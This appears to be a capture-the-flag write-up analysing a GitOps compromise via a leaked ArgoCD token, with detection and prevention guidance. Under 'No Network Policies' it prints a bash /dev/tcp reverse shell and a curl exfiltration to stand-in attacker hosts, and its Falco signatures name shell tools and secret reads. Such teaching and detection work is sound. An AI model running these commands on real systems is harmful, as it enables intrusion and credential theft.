# Challenge 4: GitOps Pipeline Compromise - Technical Analysis

## Executive Summary

This challenge demonstrates a **GitOps pipeline compromise** attack where stolen ArgoCD credentials enable an attacker to modify production Kubernetes deployments by poisoning Git repositories. The attack leverages leaked secrets from a previous container image layer vulnerability (Challenge 2) to gain access to the continuous deployment system.

**Attack Classification**: Supply Chain - Continuous Deployment Compromise  
**MITRE ATT&CK Techniques**:
- T1078 (Valid Accounts)
- T1552.001 (Credentials in Files)
- T1525 (Implant Container Image)
- T1098 (Account Manipulation)
- T1496 (Resource Hijacking - if using cryptomining variant)

## Attack Chain

```
┌─────────────────────────────────────────────────────────────┐
│  1. Initial Access: Challenge 2                             │
│     Extract .env.production from container image layers     │
│     Contains: ArgoCD token, server URL, app name            │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  2. Credential Access                                        │
│     Parse ArgoCD authentication token from .env.production  │
│     ARGOCD_AUTH_TOKEN=eyJhbGci...                           │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  3. Reconnaissance                                           │
│     - Access ArgoCD Web UI / API with stolen token          │
│     - Enumerate applications, repositories, RBAC            │
│     - Identify production-manifests Git repository          │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  4. Persistence / Impact                                     │
│     - Clone production-manifests repository                 │
│     - Inject backdoor into deployment.yaml                  │
│     - Commit and push to Git                                │
│     - ArgoCD auto-syncs malicious changes                   │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  5. Execution                                                │
│     - Backdoored pods deploy to production cluster          │
│     - Reverse shell established                             │
│     - Privilege escalation (running as root)                │
│     - Data exfiltration / cryptomining begins               │
└─────────────────────────────────────────────────────────────┘
```

## Technical Deep Dive

### Vulnerability #1: Credential Leakage

**Root Cause**: ArgoCD authentication token stored in `.env.production` file, committed to Git, leaked via container image layers (Challenge 2).

**The Leaked Credentials**:
```env
ARGOCD_SERVER=argocd-server.argocd.svc.cluster.local
ARGOCD_AUTH_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
ARGOCD_APP_NAME=recipe-api-production
```

**Token Characteristics**:
- **Type**: JWT (JSON Web Token)
- **Issuer**: ArgoCD (`iss: "argocd"`)
- **Subject**: `admin:login` (admin account!)
- **Expiration**: None (long-lived token - critical mistake!)

**Why This Is Dangerous**:
- Single token provides full ArgoCD API access
- No IP restrictions or network segmentation
- No expiration or rotation policy
- Bound to admin account (full permissions)

### Vulnerability #2: Excessive RBAC Permissions

**Vulnerable Configuration** (`argocd/vulnerable-rbac.yaml`):

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: argocd-controller-admin
subjects:
  - kind: ServiceAccount
    name: argocd-application-controller
    namespace: argocd
roleRef:
  kind: ClusterRole
  name: cluster-admin  # ❌ DANGEROUS!
```

**Impact**:
- ArgoCD controller can create/modify any Kubernetes resource
- Can escalate privileges via RBAC manipulation
- Can access secrets in any namespace
- Can deploy malicious workloads anywhere in the cluster

**Correct Configuration** (Least Privilege):
- Namespace-scoped `Role` instead of `ClusterRole`
- Only necessary verbs (`get`, `list`, `create`, `update` - NO `delete`, NO `escalate`)
- No secret write access
- Limited to specific namespaces (e.g., `production` only)

### Vulnerability #3: No Admission Control

**Missing Security**: Kyverno, OPA Gatekeeper, or Pod Security Admission not configured.

**Consequences**:
- Privileged containers allowed
- Containers running as root allowed
- Dangerous capabilities (SYS_ADMIN, NET_ADMIN) allowed
- No resource limits enforced (cryptomining risk)
- No image signature verification

**Attack Payload That Should Be Blocked**:
```yaml
securityContext:
  runAsUser: 0           # Root user
  privileged: true       # Privileged mode
  allowPrivilegeEscalation: true
  capabilities:
    add: [SYS_ADMIN]     # Dangerous capability
```

### Vulnerability #4: No Network Policies

**Default Kubernetes Behavior**: All pods can egress to any IP address.

**Attack Exploitation**:
```bash
# Reverse shell (works because egress not restricted)
bash -i >& /dev/tcp/attacker.ctf.local/4444 0>&1

# Data exfiltration (works because HTTPS egress allowed)
curl -X POST -d @/tmp/secrets.json https://attacker.com/exfil
```

**Correct Configuration**: Deny-all default with explicit allow-list.

### Vulnerability #5: Auto-Sync Without Approval

**ArgoCD Configuration**:
```yaml
syncPolicy:
  automated:
    prune: true
    selfHeal: true   # ❌ Dangerous for production!
```

**Impact**:
- Git commits automatically deployed to production
- No manual review or approval gate
- Malicious changes take effect in 1-2 minutes
- Difficult to roll back quickly

**Best Practice**: Disable auto-sync for production, require manual approval.

## Real-World Examples

### 1. SolarWinds Supply Chain Attack (2020)

**Similarities**:
- Attackers compromised build pipeline
- Injected malicious code into legitimate software
- Supply chain trust exploited
- Widespread impact across multiple organizations

**Differences**:
- SolarWinds: Build-time injection
- This challenge: Deployment-time injection via GitOps

**Impact**: 18,000+ organizations affected, months of persistence.

### 2. Codecov Bash Uploader Compromise (2021)

**Attack Vector**: Attacker modified CI/CD script to exfiltrate environment variables.

**Similarities**:
- Credentials leaked via CI/CD environment
- Secrets exfiltrated to attacker-controlled server
- Long-lived access tokens used

**Impact**: Hundreds of customer credentials stolen.

### 3. Kubernetes Cluster Cryptojacking Campaigns

**Attack Pattern**: Attackers gain cluster access, deploy cryptominers.

**Similarities**:
- High resource usage (CPU/memory)
- Disguised as legitimate workloads
- Persistence via deployment manifests

**Detection**: Unusual resource consumption, network traffic to mining pools.

## Detection Strategies

### 1. Git Activity Monitoring

**Indicators**:
- Commits at unusual times (e.g., 3 AM)
- Commits from unknown authors
- Suspicious commit messages ("debug", "temp", "testing")
- Large manifest changes in a single commit

**Tools**:
- Git hooks (pre-commit, pre-push)
- GitHub/GitLab/Gitea webhooks
- SIEM integration for Git audit logs

### 2. Kubernetes Audit Logs

**Key Events to Monitor**:
```json
{
  "verb": "update",
  "objectRef": {"resource": "deployments", "namespace": "production"},
  "user": {"username": "system:serviceaccount:argocd:argocd-application-controller"},
  "requestObject": {"spec": {"template": {"spec": {"securityContext": {"runAsUser": 0}}}}}
}
```

**Detection Rules**:
- Deployments modified to run as root
- Privilege escalation requests
- Unusual service account activity
- Resource creation in sensitive namespaces

**Tools**: Falco, Audicia, Kubescape, Tetragon

### 3. Runtime Behavior (Falco Rules)

**Signatures**:
- `spawned_process and proc.name in (nc, ncat, bash) and proc.args contains "/dev/tcp/"`
- `proc.name in (xmrig, ethminer) or proc.cmdline contains "stratum+tcp"`
- `open_read and fd.name startswith "/var/run/secrets/kubernetes.io/"`

### 4. Network Traffic Analysis

**Anomalies**:
- Connections to unknown external IPs
- High egress bandwidth (data exfiltration)
- Connections to cryptocurrency mining pools
- Unusual DNS queries

**Tools**: Cilium Hubble, Istio, Network Policy enforcement

## Prevention Strategies

See [SECURITY-GUIDE.md](./SECURITY-GUIDE.md) for detailed implementation.

**Summary**:
1. **Secrets Management**: Use external secret stores (Vault, AWS Secrets Manager)
2. **Least-Privilege RBAC**: Namespace-scoped roles, minimal permissions
3. **Admission Policies**: Kyverno/OPA to block dangerous pods
4. **Network Policies**: Default-deny egress with explicit allow-list
5. **Image Verification**: Require signed images (Cosign/Notary)
6. **GitOps Approval**: Manual review for production deployments
7. **Runtime Security**: Falco for anomaly detection
8. **Audit Logging**: Comprehensive logging and SIEM integration

## Educational Value

**Participants Learn**:
- How GitOps can be weaponized
- The importance of secret rotation and expiration
- RBAC permission boundaries
- Multi-layered security (defense in depth)
- Detection vs prevention trade-offs

**Skills Demonstrated**:
- JWT token analysis
- Git repository manipulation
- Kubernetes manifest modification
- RBAC enumeration
- Network reconnaissance

## Conclusion

This challenge demonstrates a realistic supply chain attack targeting the continuous deployment pipeline. While GitOps provides significant benefits (audit trail, declarative configuration, easy rollback), it also introduces new attack surfaces when not properly secured.

**Key Takeaways**:
- GitOps requires security controls at every layer (credentials, RBAC, admission, network)
- Leaked credentials can bypass traditional perimeter security
- Auto-sync without approval is dangerous for production
- Defense in depth is critical - no single control is sufficient

## References

- [CNCF GitOps Security Whitepaper](https://github.com/cncf/tag-security/tree/main/supply-chain-security/compromises)
- [ArgoCD Security Best Practices](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/)
- [Kubernetes Security Hardening Guide](https://kubernetes.io/docs/concepts/security/security-hardening/)
- [NIST SP 800-204C: DevSecOps for Microservices](https://www.nist.gov/publications/devsecops-microservices-based-application-systems)
